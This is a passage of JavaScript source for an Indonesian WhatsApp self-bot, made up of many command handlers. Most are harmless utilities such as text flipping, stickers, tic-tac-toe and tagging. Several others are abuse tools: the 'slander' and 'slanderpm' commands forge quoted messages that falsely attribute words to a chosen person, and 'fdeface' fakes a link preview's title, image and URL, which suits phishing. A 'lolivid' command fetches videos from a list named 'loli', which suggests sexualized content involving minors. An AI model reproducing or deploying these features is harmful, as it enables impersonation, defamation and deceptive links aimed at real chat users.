fs.unlinkSync(rname)
})
break
case 'setbio':
				if (!kal.key.fromMe && !isOwner) return
				if (args.length < 1) return freply('Teksnya?')
					iyek = body.slice(8)
					Haikal.setStatus(`${iyek}`)
					freply(from, 'Sukses', fake)
					break
					case 'setnamepp':
					if (!kal.key.fromMe && !isOwner) return
				if (args.length < 1) return freply('Teksnya?')
                anu = body.slice(9)
                Haikal.updateProfileName(anu)
                freply(from, 'Sukses', fake)
                break
// Ngebalik Huruf ( HW MODS WA )
case 'fliptext':
if (args.length < 1) return freply(`Example:\n${prefix}fliptext HAIKAL`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
freply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
break
// Angka To Huruf ( HW MODS WA )
case 'tohuruf':
if (!Number(args[0])) return freply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await toHur(quere)
freply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
freply(mess.error.api)
}
break
// Set Anti Link ( HW MODS WA )
case 'setlink':
if (!kal.key.fromMe && !isOwner) return
if (args[0] === "com") {
linknye = `${linkcom}`
freply(' Succes change antilink com')
} else if (args[0] === "id") {
linknye = `${linkid}`
freply(' Succes change antilink id')
} else if (args[0] === "xyz") {
linknye = `${linkxyz}`
freply(' Succes change antilink xyz')
} else if (args[0] === "http") {
linknye = `${linkhttp}`
freply(' Succes change antilink http')
} else if (args[0] === "ly") {
linknye = `${linkly}`
freply(' Succes change antilink ly')
} else if (args[0] === "wa") {
linknye = `${linkwa}`
freply(' Succes change antilink wa')
} else if (args[0] === "default") {
linknye = `${deflt}`
freply(' Succes change antilink default')
} else {
freply(`*List Anti Link*\n•> com\n•> id\n•> xyz\n•> ly\n•> http\n•> wa\n•> default`)
}
break
// Anti Link ( HW MODS WA )
case 'antilink':
if (!isGroup) return freply(mess.only.group)
if (!isGroupAdmins && !kal.key.fromMe && !isOwner) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (args.length < 1) return freply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiLink) return freply('Sudah Aktif')
ntilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
freply(' Succes menyalakan antilink di group ini')
Haikal.sendMessage(from, `PERINGATAN!!! jika bukan admin jangan send link di group ini`, text)
} else if (args[0] === "0") {
if (!AntiLink) return freply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
freply(' Succes mematikan antilink di group ini')
} else {
freply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
// Block List ( HW MODS WA & Nurutomo )
case 'blocklist':
let blockede = Haikal.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != Haikal.user.jid)
Haikal.reply(m.chat, `┌「 *List Blockir* 」` + `\n` + blockede.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join`\n` + `\n└────`, m, { contextInfo: { mentionedJid: blocked } })
break
// Detik Vn ( HW MODS WA & Denis )
case 'detikvn':
if (!isQuotedAudio) return freply('Reply audionya')
if (args.length < 1) return freply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Haikal.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
Haikal.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:ikal})
fs.unlinkSync(media)
break
// Detik Video ( HW MODS WA & Denis )
case 'detikvideo':
if (!isQuotedVideo) return freply('Reply videonya')
if (args.length < 1) return freply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Haikal.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
Haikal.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: ikal})
fs.unlinkSync(media)
break
// Sider ( HW MODS WA )
case 'sider':
try {
if (!isGroup) return freply('Hanya bisa didalam gruop')
if (!isQuotedReply) return freply('Reply pesan botnya')      
infom = await Haikal.messageInfo(from, kal.message.extendedTextMessage.contextInfo.stanzaId)
hemm = infom.reads
hemms = infom.deliveries
readon = hemms.map(v => v.jid)
readdin = hemm.map(v => v.jid)
stamp = hemm.map(v => v.t)
      
function toTime(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
} 	
// ambil pecahan waktu masing-masing
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();
// gabungkan ke dalam variable time
var time = `${hour}:${min}:${sec}` ;
return time;
}

function toBulan(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
} 
//buat index bulan
var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember'];
var myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum at','Sabtu'];  
// tanggal
var day = a.getDate()
bulanee = a.getMonth()
var thisDay = a.getDay(),
thisDay = myDays[thisDay];
var yy = a.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}` ;
return bul;
}
teksx = `「 *List Read Message* 」\n\n`
for (let i of hemm) {
teksx += `•> Nama : @${i.jid.split('@')[0]}\n•> Waktu : ${toTime(i.t, true)}\n•> Tanggal : ${toBulan(i.t, true)}\n\n`
}
teksx1 = `「 *List Deliveries To* 」\n\n`
for (let i of hemms){
teksx1 += `•> Nama : @${i.jid.split('@')[0]}\n`
teksx1 += `•> Waktu : ${toTime(i.t, true)}\n•> Tanggal : ${toBulan(i.t, true)}\n\n`
}
Haikal.sendMessage(from, teksx, text, { sendEphemeral: true, quoted: ikal, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readdin }})
Haikal.sendMessage(from, teksx1, text, { sendEphemeral: true, quoted: ikal, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readon }})
} catch(e) {
freply('reply pesan botnya goblok bukan pesan orang')
freply(e)
console.log(e)
}
break
// Play Store ( HW MODS WA  )
case 'playstore':
if (args.length < 1) return freply(`Example :\n${prefix}playstore termux`)
quer = args.join(" ")
hx.playstore(quer).then(res => {
teks = '```「 Play Store 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}\n`
teks += `${i.developer}`
}
freply(teks)
})
break
// Status Tictactoe ( HW MODS WA )
case 'cekhistory':
if (!isGroup)return freply('*Khusus group*')
reply(`\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`)
break
// Delete Sesi ( HW MODS WA )
case 'delsesi':
if (!isGroupAdmins && !kal.key.fromMe && !isOwner) return freply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
freply('Berhasil Menghapus Sesi Ttt')
} else {
freply('Tidak ada sesi yang berlangsung')
}
} else {
freply('Pilih')
}
break
// Tictactoe ( HW MODS WA )
case 'tictactoe':
case 'ttt':
if (!isGroup)return freply('*Khusus group*')
if (kal.message.extendedTextMessage.contextInfo.mentionedJid > 1) return freply('Hanya bisa dengan 1 orang')
if (!kal.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return freply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}deletesesi-ttt*, untuk menghapus sesi`)
if (args.length === 0) return freply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *Memulai Game Tictactoe* 」\n\n•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe \n[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan\n\n_Game tictactoe recode HAIKAL_`
Haikal.sendMessage(from, starGame, text, {quoted: ikal, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
// Surah Al-Qur'an ( HW MODS WA  )
case 'surah':
if (!kal.key.fromMe && !isOwner) return
if (args.length < 1) return freply(`Example :\n${prefix}surah 1`)
srh = args[0]
hx.surah(srh).then(res => {
teks = '```「 AL-QURAN 」```\n\n_Lebih baik baca di al-qurannya langsung biar berkah kalo dihp gk berkah_\n\n'
for (let i of res) {
teks += '*•> Arab :* ' + i.arab + '\n'
teks += '*•> Indo :* ' + i.indo + '\n'
teks += '*•> Latin :* ' + i.latin + '\n\n'
}
freply(teks)
})
break
// Style Text ( HW MODS WA & Nurutomo )
case 'styletext':
if (args.length < 1) return freply('Enter The Text')
async function stylizeText(text) {
let res = await fetch('http://qaz.wtf/u/convert.cgi?text=' + encodeURIComponent(text))
let html = await res.text()
let dom = new JSDOM(html)
let table = dom.window.document.querySelector('table').children[0].children
let obj = {}
for (let tr of table) {
let name = tr.querySelector('.aname').innerHTML
let content = tr.children[1].textContent.replace(/^\n/, '').replace(/\n$/, '')
obj[name + (obj[name] ? ' Reversed' : '')] = content
}
return obj
}
matext = args.join(" ")
let fetch = require('node-fetch')
let { JSDOM } = require('jsdom')
Haikal.freply(m.chat, Object.entries(await stylizeText(matext)).map(([name, value]) => `\`\`\`「 ${name} 」\`\`\`\n\n${value}\n\n—————————————————————————`).join`\n\n`, m)
break

// Tag ( HW MODS WA )
case 'tag':
noes = `${args[0]}@s.whatsapp.net`
beks = `@${noes.split("@")[0]}`
Haikal.sendMessage(from, beks, text, {quoted:ikal, contextInfo:{mentionedJid:[noes]}})                
break
// Copy Paste ( HW MODS WA & Nurutomo )
case 'q': 
if (!m.quoted) return freply('reply message!')
let qse = Haikal.serializeM(await m.getQuotedObj())
if (!qse.quoted) return freply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
// Happy Birth Day ( HW MODS WA  )
case 'hbd': 
let textus = args.join(" ")
if (!q) return freply(`Example:\n 2002 02 25`)
const zodiak = [
    ["Capricorn", new Date(1970, 0, 1)],
    ["Aquarius", new Date(1970, 0, 20)],
    ["Pisces", new Date(1970, 1, 19)],
    ["Aries", new Date(1970, 2, 21)],
    ["Taurus", new Date(1970, 3, 21)],
    ["Gemini", new Date(1970, 4, 21)],
    ["Cancer", new Date(1970, 5, 22)],
    ["Leo", new Date(1970, 6, 23)],
    ["Virgo", new Date(1970, 7, 23)],
    ["Libra", new Date(1970, 8, 23)],
    ["Scorpio", new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
    let d = new Date(1970, month - 1, day)
    return zodiak.find(([_,_d]) => d >= _d)[0]
}
    const date = new Date(textus)
    if (date == 'Invalid Date') throw date
    const d = new Date()
    const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
    const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
    
    const zodiac = getZodiac(birth[1], birth[2])
    const ageD = new Date(d - date)
    const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

    const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
    const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

    const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
    m.freply(teksh)
break
// Delete Private Message ( HW MODS WA )
case 'deletepc':
if (!kal.key.fromMe && !isOwner) return
anu = await Haikal.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
for (let _ of anu) {
Haikal.modifyChat(_.jid, 'delete', {
includeStarred: false
})
}
await freply(`Berhasil menghapus ${anu.length} pribadi chat`)
break
case 'delchat':
                    if (!isOwner && !kal.key.fromMe) return reply(mess.only.ownerB)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                Haikal.modifyChat(from, ChatModification.delete)
                break
// Online ( HW MODS WA  )
case 'on':
if (!kal.key.fromMe && !isOwner) return 
offline = false
freply(' ``ANDA TELAH ONLINE``` ')
break
case 'onlinedong':
if (!kal.key.fromMe && !isOwner) return 
offline = false
kalkal(' ``ANDA TELAH ONLINE``` ')
break
case 'sc':
offline = false
bct(' https://duit.cc/AaPnL7 ')
break
// Status Bot ( HW MODS WA )
case 'status':
case 'mystat':
case 'botstat':
fkhs = sender
teks = `\`\`\`「 Status Bot 」\`\`\`

*${ucapanWaktu}* @${fkhs.split("@")[0]}
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}

*•> Base :* HW MODS WA
*•> Recode :* HAIKAL - HW BOT
*•> Lib :* Baileys, ${bailver}
*•> Prefix :* ${prefi}
*•> Versi Bot :* ${botver}

*•> Merk HP :* ${device_manufacturer}
*•> Versi OS :* ${os_version}
*•> Versi HP :* ${device_model}
*•> MCC :* ${mcc}
*•> MNC :* ${mnc}
*•> Baterai :* ${isBattre}
*•> Charger :* ${isCharge}

*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
*•> Runtime :* ${kyun(run)}

*${offline ? "OFFLINE" : "ONLINE"}*
*${banChats ? "SELF-MODE" : "PUBLIC-MODE"}*`
Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid:[fkhs], "externalAdReply":flink}})
break
    case 'off':
            if (!kal.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            freply(' ```ANDA TELAH OFFLINE``` ')
            break   
   case 'get':
if(!q) return reply('linknya?')
reply(mess.wait)
fetch(`${args[0]}`).then(res => res.text())  
.then(bu =>{
reply(bu)
})   
break
case 'lolivid':
       case 'lolivideo':
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
    case 'kontag':
            if (!kal.key.fromMe && !isOwner) return freply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return freply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            Haikal.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !kal.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            freply(`*Reply sticker yang sudah dikirim*`)
            }
            break
	case 'mute':
			    if (!isOwner && !kal.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
    case 'totag':
            if ((isMedia && !kal.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !kal.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !kal.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !kal.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          freply(`reply gambar/sticker/audio/video dengan caption🔥➥ ${prefix}totag`)
        }
        break
    case 'slander':
            if (args.length < 1) return freply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = kal.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            Haikal.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return freply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(` Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'slanderpm':
            if(!q) return freply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = kal.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await Haikal.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await Haikal.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return freply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            Haikal.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
            case 'lirik':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
    case 'take':
    case 'colong':
if (isBan) return reply(mess.ban)
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `HW MODS WA`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `XM-HW`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, Haikal, kal, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
if (isBan) return reply(mess.ban)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !kal.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
             media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            Haikal.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ikal })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            Haikal.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ikal })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && kal.message.videoMessage.seconds < 11 || isQuotedVideo && kal.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
            const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            Haikal.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ikal })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            Haikal.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ikal })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption🔥➥ ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!kal.key.fromMe && !isOwner) return
            if (!q) return fakestatus('Isi teksnya!')
            Haikal.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(` Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!kal.key.fromMe && !isOwner) return
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            cihcih = await Haikal.downloadMediaMessage(swsw)
            Haikal.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = ` Sukses Upload Story Image dengan Caption: ${q}`
            Haikal.sendMessage(from, bur, text, { quoted: ikal })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!kal.key.fromMe && !isOwner) return
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            cihcih = await Haikal.downloadMediaMessage(swsw)
            Haikal.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = ` Sukses Upload Story Video dengan Caption: ${q}`
            Haikal.sendMessage(from, bur, text, { quoted: ikal })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion🔥➥ ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
            const tipes = await Haikal.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await Haikal.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		Haikal.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
          	if (!kal.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	freply(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!kal.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	freply(`「 *SELF-MODE* 」`)
          	break
case 'infoall': case 'tagall':
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = kal.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ╠➥ 🗿 @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*From :${pushname} 👋*\n\n*Info :  ${q}*\n\n*Total Member :* ${groupMembers.length} \n\n┏━ *「 ${fake1} 」* `+teks+`┗━ *「 ${fake1} 」* `, members_id, false)
break
case 'tagall3':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					Haikal.sendMessage(from, teks, text, {detectLinks: false, quoted: ikal})
					break
 	case 'hidetag':
			if (!kal.key.fromMe && !isOwner && !isGroupAdmins) return freply('Admin Group Only')
			if (!isGroup) return freply(mess.only.group)
			var value = args.join(' ')
			var group = await Haikal.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: ikal
			}
			Haikal.sendMessage(from, optionshidetag, text)
			break
case 'me':
       case 'profile':              
              if (isBan) return reply(mess.ban)
if (kal.message.extendedTextMessage != undefined){
mentioned = kal.message.extendedTextMessage.contextInfo.participant
try {
pic = await Haikal.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
var yy = kal.message.extendedTextMessage.contextInfo.participant
var p = await Haikal.getStatus(`${yy}`, MessageType.text)
thumb = await getBuffer(pic)
